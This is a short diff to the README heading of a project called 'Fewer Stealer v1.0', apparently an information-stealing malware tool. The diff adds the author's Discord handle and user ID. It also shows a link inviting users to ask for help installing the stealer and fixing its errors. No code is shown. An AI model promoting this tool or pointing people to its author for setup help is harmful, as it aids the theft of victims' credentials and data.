@@ -1,4 +1,7 @@
 <h1 align="center">
+
+🦊**My discord address you can contact me: xFixxy#6624(My User Id : 1133511356109312093)**
+
 🛡️ Fewer Stealer v1.0
 
 ❗️ If you have ideas and don't know how to install and errors in stealer, you can ask and tell everything https://github.com/fewerstealer/fewerstealer/issues
